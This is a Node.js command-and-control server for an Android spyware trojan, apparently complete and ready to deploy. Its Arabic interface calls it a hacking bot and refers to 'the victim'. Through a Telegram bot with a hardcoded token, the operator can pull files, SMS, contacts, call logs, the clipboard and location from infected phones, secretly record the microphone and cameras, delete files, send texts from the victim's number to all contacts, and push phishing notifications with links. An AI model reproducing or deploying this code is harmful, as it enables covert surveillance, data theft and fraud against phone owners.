const express = require('express');
const webSocket = require('ws');
const http = require('http')
const telegramBot = require('node-telegram-bot-api')
const uuid4 = require('uuid')
const multer = require('multer');
const bodyParser = require('body-parser')
const axios = require("axios");
const token = '8573772377:AAEk7mHDn41tjyloOxwzFvp4n6guvD6n1lY'
const id = '7305720183'
const address = 'https://www.google.com'

const app = express();
const appServer = http.createServer(app);
const appSocket = new webSocket.Server({server: appServer});
const appBot = new telegramBot(token, {polling: true});
const appClients = new Map()

let currentNumber = '';
let currentUuid = '';
let currentTitle = '';

app.use(bodyParser.json({limit: '50mb'}));
app.use(bodyParser.urlencoded({
    limit: '50mb',
    extended: true,
    parameterLimit: 50000
}));

const upload = multer({
    limits: {
        fileSize: 50 * 1024 * 1024
    }
});

app.get('/', function (req, res) {
    res.send('<h1 align="center">تم تشغيل البوت بنجاح ✅ مطور البوت: @jt_r3r 📱</h1>')
})

app.post("/uploadFile", upload.single('file'), (req, res) => {
    const name = req.file.originalname
    appBot.sendDocument(id, req.file.buffer, {
            caption: `°• رسالة من جهاز <b>${req.headers.model}</b> 📁`,
            parse_mode: "HTML"
        },
        {
            filename: name,
            contentType: 'application/txt',
        })
    res.send('')
})

app.post("/uploadText", (req, res) => {
    appBot.sendMessage(id, `°• رسالة من جهاز <b>${req.headers.model}</b> ✉️\n\n` + req.body['text'], {parse_mode: "HTML"})
    res.send('')
})

app.post("/uploadLocation", (req, res) => {
    appBot.sendLocation(id, req.body['lat'], req.body['lon'])
    appBot.sendMessage(id, `°• موقع من جهاز <b>${req.headers.model}</b> 📍`, {parse_mode: "HTML"})
    res.send('')
})

appSocket.on('connection', (ws, req) => {
    const uuid = uuid4.v4()
    const model = req.headers.model
    const battery = req.headers.battery
    const version = req.headers.version
    const brightness = req.headers.brightness
    const provider = req.headers.provider

    ws.uuid = uuid
    appClients.set(uuid, {
        model: model,
        battery: battery,
        version: version,
        brightness: brightness,
        provider: provider
    })
    
    appBot.sendMessage(id,
        `°• جهاز جديد متصل 📱\n\n` +
        `• موديل الجهاز: <b>${model}</b> 📱\n` +
        `• البطارية: <b>${battery}</b> 🔋\n` +
        `• نظام الاندرويد: <b>${version}</b> 🤖\n` +
        `• سطوح الشاشة: <b>${brightness}</b> 💡\n` +
        `• مزود: <b>${provider}</b> 🌐`,
        {parse_mode: "HTML"}
    )
    
    ws.on('close', function () {
        appBot.sendMessage(id,
            `°• تم قطع الاتصال بالجهاز ❌\n\n` +
            `• موديل الجهاز: <b>${model}</b> 📱\n` +
            `• البطارية: <b>${battery}</b> 🔋\n` +
            `• نظام الاندرويد: <b>${version}</b> 🤖\n` +
            `• سطوح الشاشة: <b>${brightness}</b> 💡\n` +
            `• مزود: <b>${provider}</b> 🌐`,
            {parse_mode: "HTML"}
        )
        appClients.delete(ws.uuid)
    })
})

appBot.on('message', (message) => {
    const chatId = message.chat.id;
    if (message.reply_to_message) {
        if (message.reply_to_message.text.includes('°• الرجاء كتابة رقم الذي تريد ارسال الية من رقم الضحية')) {
            currentNumber = message.text
            appBot.sendMessage(id,
                '°• جيد الان قم بكتابة الرسالة المراد ارسالها من جهاز الضحية الئ الرقم الذي كتبتة قبل قليل... ✉️\n\n' +
                '• كن حذرًا من أن الرسالة لن يتم إرسالها إذا كان عدد الأحرف في رسالتك أكثر من المسموح به ⚠️',
                {reply_markup: {force_reply: true}}
            )
        }
        if (message.reply_to_message.text.includes('°• جيد الان قم بكتابة الرسالة المراد ارسالها من جهاز الضحية الئ الرقم الذي كتبتة قبل قليل....')) {
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`send_message:${currentNumber}/${message.text}`)
                }
            });
            currentNumber = ''
            currentUuid = ''
            appBot.sendMessage(id,
                '°• طلبك قيد المعالجة الرجاء الانتظار... ⏳\n\n' +
                '• ستتلقى ردًا في اللحظات القليلة القادمة 📨',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [
                            ["الاجهزة المتصلة 📱"], 
                            ["تنفيذ الامر ⚙️"],
                            ["معلومات المطور 👨‍💻"]
                        ],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• الرجاء كتابة الرسالة المراد ارسالها الئ الجميع')) {
            const message_to_all = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`send_message_to_all:${message_to_all}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• طلبك قيد المعالجة الرجاء الانتظار... ⏳\n\n' +
                '• ستتلقى ردًا في اللحظات القليلة القادمة 📨',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [
                            ["الاجهزة المتصلة 📱"], 
                            ["تنفيذ الامر ⚙️"],
                            ["معلومات المطور 👨‍💻"]
                        ],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• ادخل مسار الملف الذي تريد سحبة من جهاز الضحية')) {
            const path = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`file:${path}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• طلبك قيد المعالجة الرجاء الانتظار... ⏳\n\n' +
                '• ستتلقى ردًا في اللحظات القليلة القادمة 📨',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [
                            ["الاجهزة المتصلة 📱"], 
                            ["تنفيذ الامر ⚙️"],
                            ["معلومات المطور 👨‍💻"]
                        ],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• ادخل مسار الملف الذي تريد ')) {
            const path = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`delete_file:${path}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• طلبك قيد المعالجة الرجاء الانتظار... ⏳\n\n' +
                '• ستتلقى ردًا في اللحظات القليلة القادمة 📨',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [
                            ["الاجهزة المتصلة 📱"], 
                            ["تنفيذ الامر ⚙️"],
                            ["معلومات المطور 👨‍💻"]
                        ],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• ادخل المدة الذي تريد تسجيل صوت الضحية')) {
            const duration = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`microphone:${duration}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• طلبك قيد المعالجة الرجاء الانتظار... ⏳\n\n' +
                '• ستتلقى ردًا في اللحظات القليلة القادمة 📨',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [
                            ["الاجهزة المتصلة 📱"], 
                            ["تنفيذ الامر ⚙️"],
                            ["معلومات المطور 👨‍💻"]
                        ],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• ادخل المدة الذي تريد تسجيل الكاميرا الامامية')) {
            const duration = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`rec_camera_main:${duration}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• طلبك قيد المعالجة الرجاء الانتظار... ⏳\n\n' +
                '• ستتلقى ردًا في اللحظات القليلة القادمة 📨',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [
                            ["الاجهزة المتصلة 📱"], 
                            ["تنفيذ الامر ⚙️"],
                            ["معلومات المطور 👨‍💻"]
                        ],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• ادخل المدة الذي تريد تسجيل كاميرا السلفي للضحية')) {
            const duration = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`rec_camera_selfie:${duration}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• طلبك قيد المعالجة الرجاء الانتظار... ⏳\n\n' +
                '• ستتلقى ردًا في اللحظات القليلة القادمة 📨',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [
                            ["الاجهزة المتصلة 📱"], 
                            ["تنفيذ الامر ⚙️"],
                            ["معلومات المطور 👨‍💻"]
                        ],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• ادخل الرسالة التي تريد ان تظهر علئ جهاز الضحية')) {
            const toastMessage = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`toast:${toastMessage}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• طلبك قيد المعالجة الرجاء الانتظار... ⏳\n\n' +
                '• ستتلقى ردًا في اللحظات القليلة القادمة 📨',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [
                            ["الاجهزة المتصلة 📱"], 
                            ["تنفيذ الامر ⚙️"],
                            ["معلومات المطور 👨‍💻"]
                        ],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• ادخل الرسالة التي تريدها تظهر كما إشعار')) {
            const notificationMessage = message.text
            currentTitle = notificationMessage
            appBot.sendMessage(id,
                '°• رائع ، أدخل الآن الرابط الذي تريد فتحه بواسطة الإشعار 🌐\n\n' +
                '• عندما ينقر الضحية على الإشعار ، سيتم فتح الرابط الذي تقوم بإدخاله 🔗',
                {reply_markup: {force_reply: true}}
            )
        }
        if (message.reply_to_message.text.includes('°• رائع ، أدخل الآن الرابط الذي تريد فتحه بواسطة الإشعار')) {
            const link = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`show_notification:${currentTitle}/${link}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• طلبك قيد المعالجة الرجاء الانتظار... ⏳\n\n' +
                '• ستتلقى ردًا في اللحظات القليلة القادمة 📨',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [
                            ["الاجهزة المتصلة 📱"], 
                            ["تنفيذ الامر ⚙️"],
                            ["معلومات المطور 👨‍💻"]
                        ],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• أدخل رابط الصوت الذي تريد تشغيله')) {
            const audioLink = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`play_audio:${audioLink}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• طلبك قيد المعالجة الرجاء الانتظار... ⏳\n\n' +
                '• ستتلقى ردًا في اللحظات القليلة القادمة 📨',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [
                            ["الاجهزة المتصلة 📱"], 
                            ["تنفيذ الامر ⚙️"],
                            ["معلومات المطور 👨‍💻"]
                        ],
                        'resize_keyboard': true
                    }
                }
            )
        }
    }
    
    if(chatId == id){
        if(message.text == '/start'){
            appBot.sendMessage(id,
                '°• مرحبًا بكم في بوت الاختراق 📱\n\n' +
                '• مطور البوت: @jt_r3r 👨‍💻\n\n' +
                '• إذا كان التطبيق مثبتًا على الجهاز المستهدف ✅، فانتظر الاتصال... 📡\n\n' +
                '• عندما تتلقى رسالة الاتصال 📨، فهذا يعني أن الجهاز المستهدف متصل وجاهز لاستلام الأمر ⚡\n\n' +
                '• انقر على زر الأمر ⚙️ وحدد الجهاز المطلوب ثم حدد الأمر المطلوب بين الأوامر 🛠️\n\n' +
                '• إذا علقت في مكان ما في الروبوت 🤖، أرسل /start الأمر ⚡',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [
                            ["الاجهزة المتصلة 📱"], 
                            ["تنفيذ الامر ⚙️"],
                            ["معلومات المطور 👨‍💻"]
                        ],
                        'resize_keyboard': true
                    }
                }
            )
        }
        
        if (message.text == 'معلومات المطور 👨‍💻') {
            appBot.sendMessage(id, 
                '°• معلومات المطور 👨‍💻\n\n' +
                '• المطور: @jt_r3r\n' +
                '• حساب التليجرام: @jt_r3r\n\n' +
                '• للتواصل مع المطور للاستفسارات أو الدعم التقني 💬'
            )
        }
        
        if (message.text == 'الاجهزة المتصلة 📱') {
            if (appClients.size == 0) {
                appBot.sendMessage(id,
                    '°• لا توجد أجهزة متصلة ❌\n\n' +
                    '• تأكد من تثبيت التطبيق على الجهاز المستهدف 📱'
                )
            } else {
                let text = '°• قائمة الأجهزة المتصلة 📋:\n\n'
                appClients.forEach(function (value, key, map) {
                    text += `• موديل الجهاز: <b>${value.model}</b> 📱\n` +
                        `• البطارية: <b>${value.battery}</b> 🔋\n` +
                        `• نظام الاندرويد: <b>${value.version}</b> 🤖\n` +
                        `• سطوح الشاشة: <b>${value.brightness}</b> 💡\n` +
                        `• مزود: <b>${value.provider}</b> 🌐\n\n`
                })
                appBot.sendMessage(id, text, {parse_mode: "HTML"})
            }
        }
        
        if (message.text == 'تنفيذ الامر ⚙️') {
            if (appClients.size == 0) {
                appBot.sendMessage(id,
                    '°• لا توجد أجهزة متصلة ❌\n\n' +
                    '• تأكد من تثبيت التطبيق على الجهاز المستهدف 📱'
                )
            } else {
                const deviceListKeyboard = []
                appClients.forEach(function (value, key, map) {
                    deviceListKeyboard.push([{
                        text: value.model + ' 📱',
                        callback_data: 'device:' + key
                    }])
                })
                appBot.sendMessage(id, '°• حدد الجهاز المراد تنفيذ عليه الأوامر 🎯', {
                    "reply_markup": {
                        "inline_keyboard": deviceListKeyboard,
                    },
                })
            }
        }
    } else {
        appBot.sendMessage(id, '°• طلب الإذن مرفوض 🚫')
    }
})

appBot.on("callback_query", (callbackQuery) => {
    const msg = callbackQuery.message;
    const data = callbackQuery.data
    const commend = data.split(':')[0]
    const uuid = data.split(':')[1]
    
    if (commend == 'device') {
        appBot.editMessageText(`°• حدد الأمر للجهاز: <b>${appClients.get(data.split(':')[1]).model}</b> 📱`, {
            width: 10000,
            chat_id: id,
            message_id: msg.message_id,
            reply_markup: {
                inline_keyboard: [
                    [
                        {text: '📱 التطبيقات', callback_data: `apps:${uuid}`},
                        {text: '📲 معلومات الجهاز', callback_data: `device_info:${uuid}`}
                    ],
                    [
                        {text: '📂 الحصول على الملفات', callback_data: `file:${uuid}`},
                        {text: '🗃️ حذف ملف', callback_data: `delete_file:${uuid}`}
                    ],
                    [
                        {text: '📃 الحافظة', callback_data: `clipboard:${uuid}`},
                        {text: '🎙️ الميكروفون', callback_data: `microphone:${uuid}`},
                    ],
                    [
                        {text: '📷 الكاميرا الأمامية', callback_data: `camera_main:${uuid}`},
                        {text: '📸 الكاميرا السلفي', callback_data: `camera_selfie:${uuid}`}
                    ],
                    [
                        {text: '📍 الموقع', callback_data: `location:${uuid}`},
                        {text: '👹 نخب', callback_data: `toast:${uuid}`}
                    ],
                    [
                        {text: '☎️ المكالمات', callback_data: `calls:${uuid}`},
                        {text: '👤 جهات الاتصال', callback_data: `contacts:${uuid}`}
                    ],
                    [
                        {text: '📳 يهتز', callback_data: `vibrate:${uuid}`},
                        {text: '⚠️ إظهار الإشعارات', callback_data: `show_notification:${uuid}`}
                    ],
                    [
                        {text: '📨 الرسائل', callback_data: `messages:${uuid}`},
                        {text: '✉️ إرسال رسالة', callback_data: `send_message:${uuid}`}
                    ],
                    [
                        {text: '🔊 تشغيل ملف صوتي', callback_data: `play_audio:${uuid}`},
                        {text: '🔇 إيقاف الملف الصوتي', callback_data: `stop_audio:${uuid}`},
                    ],
                    [
                        {
                            text: '✉️ إرسال رسالة لجميع جهات الاتصال',
                            callback_data: `send_message_to_all:${uuid}`
                        }
                    ],
                ]
            },
            parse_mode: "HTML"
        })
    }
    
    if (commend == 'calls') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('calls');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• طلبك قيد المعالجة الرجاء الانتظار... ⏳\n\n' +
            '• ستتلقى ردًا في اللحظات القليلة القادمة 📨',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [
                        ["الاجهزة المتصلة 📱"], 
                        ["تنفيذ الامر ⚙️"],
                        ["معلومات المطور 👨‍💻"]
                    ],
                    'resize_keyboard': true
                }
            }
        )
    }
    
    if (commend == 'contacts') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('contacts');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• طلبك قيد المعالجة الرجاء الانتظار... ⏳\n\n' +
            '• ستتلقى ردًا في اللحظات القليلة القادمة 📨',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [
                        ["الاجهزة المتصلة 📱"], 
                        ["تنفيذ الامر ⚙️"],
                        ["معلومات المطور 👨‍💻"]
                    ],
                    'resize_keyboard': true
                }
            }
        )
    }
    
    if (commend == 'messages') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('messages');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• طلبك قيد المعالجة الرجاء الانتظار... ⏳\n\n' +
            '• ستتلقى ردًا في اللحظات القليلة القادمة 📨',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [
                        ["الاجهزة المتصلة 📱"], 
                        ["تنفيذ الامر ⚙️"],
                        ["معلومات المطور 👨‍💻"]
                    ],
                    'resize_keyboard': true
                }
            }
        )
    }
    
    if (commend == 'apps') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('apps');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• طلبك قيد المعالجة الرجاء الانتظار... ⏳\n\n' +
            '• ستتلقى ردًا في اللحظات القليلة القادمة 📨',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [
                        ["الاجهزة المتصلة 📱"], 
                        ["تنفيذ الامر ⚙️"],
                        ["معلومات المطور 👨‍💻"]
                    ],
                    'resize_keyboard': true
                }
            }
        )
    }
    
    if (commend == 'device_info') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('device_info');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• طلبك قيد المعالجة الرجاء الانتظار... ⏳\n\n' +
            '• ستتلقى ردًا في اللحظات القليلة القادمة 📨',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [
                        ["الاجهزة المتصلة 📱"], 
                        ["تنفيذ الامر ⚙️"],
                        ["معلومات المطور 👨‍💻"]
                    ],
                    'resize_keyboard': true
                }
            }
        )
    }
    
    if (commend == 'clipboard') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('clipboard');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• طلبك قيد المعالجة الرجاء الانتظار... ⏳\n\n' +
            '• ستتلقى ردًا في اللحظات القليلة القادمة 📨',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [
                        ["الاجهزة المتصلة 📱"], 
                        ["تنفيذ الامر ⚙️"],
                        ["معلومات المطور 👨‍💻"]
                    ],
                    'resize_keyboard': true
                }
            }
        )
    }
    
    if (commend == 'camera_main') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('camera_main');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• طلبك قيد المعالجة الرجاء الانتظار... ⏳\n\n' +
            '• ستتلقى ردًا في اللحظات القليلة القادمة 📨',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [
                        ["الاجهزة المتصلة 📱"], 
                        ["تنفيذ الامر ⚙️"],
                        ["معلومات المطور 👨‍💻"]
                    ],
                    'resize_keyboard': true
                }
            }
        )
    }
    
    if (commend == 'camera_selfie') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('camera_selfie');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• طلبك قيد المعالجة الرجاء الانتظار... ⏳\n\n' +
            '• ستتلقى ردًا في اللحظات القليلة القادمة 📨',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [
                        ["الاجهزة المتصلة 📱"], 
                        ["تنفيذ الامر ⚙️"],
                        ["معلومات المطور 👨‍💻"]
                    ],
                    'resize_keyboard': true
                }
            }
        )
    }
    
    if (commend == 'location') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('location');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• طلبك قيد المعالجة الرجاء الانتظار... ⏳\n\n' +
            '• ستتلقى ردًا في اللحظات القليلة القادمة 📨',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [
                        ["الاجهزة المتصلة 📱"], 
                        ["تنفيذ الامر ⚙️"],
                        ["معلومات المطور 👨‍💻"]
                    ],
                    'resize_keyboard': true
                }
            }
        )
    }
    
    if (commend == 'vibrate') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('vibrate');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• طلبك قيد المعالجة الرجاء الانتظار... ⏳\n\n' +
            '• ستتلقى ردًا في اللحظات القليلة القادمة 📨',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [
                        ["الاجهزة المتصلة 📱"], 
                        ["تنفيذ الامر ⚙️"],
                        ["معلومات المطور 👨‍💻"]
                    ],
                    'resize_keyboard': true
                }
            }
        )
    }
    
    if (commend == 'stop_audio') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('stop_audio');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• طلبك قيد المعالجة الرجاء الانتظار... ⏳\n\n' +
            '• ستتلقى ردًا في اللحظات القليلة القادمة 📨',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [
                        ["الاجهزة المتصلة 📱"], 
                        ["تنفيذ الامر ⚙️"],
                        ["معلومات المطور 👨‍💻"]
                    ],
                    'resize_keyboard': true
                }
            }
        )
    }
    
    if (commend == 'send_message') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id, 
            '°• الرجاء كتابة الرقم الذي تريد إرسال الرسالة إليه من رقم الضحية 📞\n\n' +
            '• إذا كنت ترغب في إرسال الرسائل القصيرة إلى أرقام الدول المحلية، يمكنك إدخال الرقم بصفر في البداية، وإلا أدخل الرقم مع رمز البلد 🌍',
            {reply_markup: {force_reply: true}}
        )
        currentUuid = uuid
    }
    
    if (commend == 'send_message_to_all') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• الرجاء كتابة الرسالة المراد إرسالها إلى الجميع 📨\n\n' +
            '• كن حذرًا من أن الرسالة لن يتم إرسالها إذا كان عدد الأحرف في رسالتك أكثر من المسموح به ⚠️',
            {reply_markup: {force_reply: true}}
        )
        currentUuid = uuid
    }
    
    if (commend == 'file') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• أدخل مسار الملف الذي تريد سحبه من جهاز الضحية 📂\n\n' +
            '• لا تحتاج إلى إدخال مسار الملف الكامل، فقط أدخل المسار الرئيسي. على سبيل المثال، أدخل <b>DCIM/Camera</b> لتلقي ملفات المعرض 📷',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    
    if (commend == 'delete_file') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• أدخل مسار الملف الذي تريد حذفه 🗑️\n\n' +
            '• لا تحتاج إلى إدخال مسار الملف الكامل، فقط أدخل المسار الرئيسي. على سبيل المثال، أدخل <b>DCIM/Camera</b> لحذف ملفات المعرض 📷',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    
    if (commend == 'microphone') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• أدخل المدة التي تريد تسجيل صوت الضحية فيها ⏱️\n\n' +
            '• لاحظ أنه يجب إدخال الوقت عدديًا بوحدات من الثواني ⏰',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    
    if (commend == 'toast') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• أدخل الرسالة التي تريد أن تظهر على جهاز الضحية 💬\n\n' +
            '• هي رسالة قصيرة تظهر على شاشة الجهاز لبضع ثوان ⏱️',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    
    if (commend == 'show_notification') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• أدخل الرسالة التي تريدها تظهر كإشعار 🔔\n\n' +
            '• ستظهر رسالتك في شريط حالة الجهاز الهدف مثل الإشعار العادي 📲',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    
    if (commend == 'play_audio') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• أدخل رابط الصوت الذي تريد تشغيله 🎵\n\n' +
            '• لاحظ أنه يجب عليك إدخال الرابط المباشر للصوت المطلوب 🔗، وإلا فلن يتم تشغيل الصوت ❌',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
});

setInterval(function () {
    appSocket.clients.forEach(function each(ws) {
        ws.send('ping')
    });
    try {
        axios.get(address).then(r => "")
    } catch (e) {
    }
}, 5000)

const PORT = process.env.PORT || 8999;
appServer.listen(PORT, () => {
    console.log(`✅ Server running on port ${PORT}`);
});
